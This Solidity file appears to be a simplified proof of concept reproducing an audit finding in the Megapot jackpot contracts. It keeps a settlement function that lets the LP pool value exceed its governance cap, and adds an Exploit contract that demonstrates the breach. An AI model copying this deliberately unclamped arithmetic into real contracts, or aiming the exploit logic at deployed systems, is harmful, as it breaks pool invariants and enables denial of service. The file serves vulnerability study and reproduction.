// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

/*//////////////////////////////////////////////////////////////////////////
    Megapot — LP pool cap may be exceeded on drawing settlement
    (Code4rena 2025-11-megapot, finding #64142, H-03)

    SYNTHETIC, cheatcode-free reduction for the EVM Playground.
    Root cause: processDrawingSettlement computes newLPValue from earnings
    without enforcing the same governance / calculated pool cap used on
    deposits. After a no-winner draw, LP value can grow past governancePoolCap,
    breaking the documented invariant and enabling later ticket bit-vector
    overflow (DoS on max-bonus-ball bets).

    Vulnerable lines preserved (@> VULN).
//////////////////////////////////////////////////////////////////////////*/

/// @notice Reduced JackpotLPManager — settlement path only.
contract JackpotLPManager {
    address public jackpot;
    uint256 public governancePoolCap;
    uint256 public lpPoolCap; // calculated safe cap (mirrors real field)

    struct LPDrawingState {
        uint256 lpPoolTotal;
        uint256 pendingDeposits;
        uint256 pendingWithdrawals; // in LP shares terms; reduced to USDC units
    }

    mapping(uint256 => LPDrawingState) public lpDrawingState;

    modifier onlyJackpot() {
        require(msg.sender == jackpot, "only jackpot");
        _;
    }

    constructor(address _jackpot, uint256 _govCap, uint256 _lpCap) {
        jackpot = _jackpot;
        governancePoolCap = _govCap;
        lpPoolCap = _lpCap;
    }

    /// @dev Seed a drawing's LP state (setup for the settlement attack path).
    function seedDrawing(uint256 drawingId, uint256 lpPoolTotal, uint256 pendingDeposits) external {
        require(msg.sender == jackpot, "only jackpot");
        lpDrawingState[drawingId] = LPDrawingState({
            lpPoolTotal: lpPoolTotal,
            pendingDeposits: pendingDeposits,
            pendingWithdrawals: 0
        });
    }

    function getLPDrawingState(uint256 drawingId) external view returns (LPDrawingState memory) {
        return lpDrawingState[drawingId];
    }

    // ============================================================
    //  Vulnerable processDrawingSettlement — JackpotLPManager.sol
    //  L371-L392 (verbatim arithmetic; no pool-cap clamp).
    // ============================================================
    function processDrawingSettlement(
        uint256 _drawingId,
        uint256 _lpEarnings,
        uint256 _userWinnings,
        uint256 _protocolFeeAmount
    ) external onlyJackpot returns (uint256 newLPValue, uint256 newAccumulator) {
        LPDrawingState storage currentLP = lpDrawingState[_drawingId];
        // Post-draw LP value has no pool-cap check (finding L378).
        uint256 postDrawLpValue = currentLP.lpPoolTotal + _lpEarnings - _userWinnings - _protocolFeeAmount; // @> VULN: no cap on post-draw LP
        // ... intermediate withdrawal accounting simplified ...
        uint256 withdrawalsInUSDC = currentLP.pendingWithdrawals;
        // FIX: newLPValue = min(postDrawLpValue + pendingDeposits - withdrawals, governancePoolCap)
        //      and clamp against the calculated safe lpPoolCap as deposits do.
        newLPValue = postDrawLpValue + currentLP.pendingDeposits - withdrawalsInUSDC; // @> VULN: uncapped newLPValue
        newAccumulator = 0;
        // Persist for next drawing (real code advances drawing id).
        lpDrawingState[_drawingId + 1].lpPoolTotal = newLPValue;
    }
}

/// @dev Minimal Jackpot that only settles a drawing and exposes the broken state.
contract Jackpot {
    JackpotLPManager public lpManager;
    uint256 public lastNewLPValue;

    function setLpManager(JackpotLPManager m) external {
        require(address(lpManager) == address(0), "set");
        lpManager = m;
    }

    /// @dev Seed LP at (just under) the governance cap, then settle a no-winner
    ///      draw with positive LP earnings — exceeding the cap.
    function setupAndSettle(
        uint256 drawingId,
        uint256 lpAtCap,
        uint256 earnings
    ) external {
        // LP is already at the governance cap (deposit path enforced the cap).
        lpManager.seedDrawing(drawingId, lpAtCap, 0);
        // No winners: userWinnings=0, protocolFee=0; all ticket edge goes to LP.
        (uint256 newLPValue,) = lpManager.processDrawingSettlement(drawingId, earnings, 0, 0);
        lastNewLPValue = newLPValue;
    }
}

/// @dev CREATE order: 1 Jackpot, 2 JackpotLPManager
contract Exploit {
    // Safe limit illustration (from finding): governance cap 630_000e6,
    // LP already at cap; earnings push past it.
    uint256 public constant GOV_CAP = 630_000e6;
    uint256 public constant LP_CAP = 630_000e6;
    uint256 public constant EARNINGS = 30_000e6; // ~edge from ticket sales

    Jackpot public jackpot; // nonce 1
    JackpotLPManager public lpManager; // nonce 2 — vulnerable

    constructor() {
        jackpot = new Jackpot();
        lpManager = new JackpotLPManager(address(jackpot), GOV_CAP, LP_CAP);
        jackpot.setLpManager(lpManager);
    }

    function run() external {
        // Baseline: LP pool sits exactly at governance cap (deposit path OK).
        require(lpManager.governancePoolCap() == GOV_CAP, "gov cap");

        // Settle a no-winner draw with positive LP earnings while already at cap.
        jackpot.setupAndSettle(1, GOV_CAP, EARNINGS);

        uint256 newLP = jackpot.lastNewLPValue();
        // HARM: documented invariant "lpPoolTotal + pendingDeposits <= governancePoolCap"
        // is broken. Real system then computes bonusBallMax that overflows bit vector.
        require(newLP > GOV_CAP, "harm not demonstrated: pool cap not exceeded");
        require(newLP > lpManager.lpPoolCap(), "harm: calculated lpPoolCap also exceeded");
        require(newLP == GOV_CAP + EARNINGS, "unexpected new LP");
    }
}
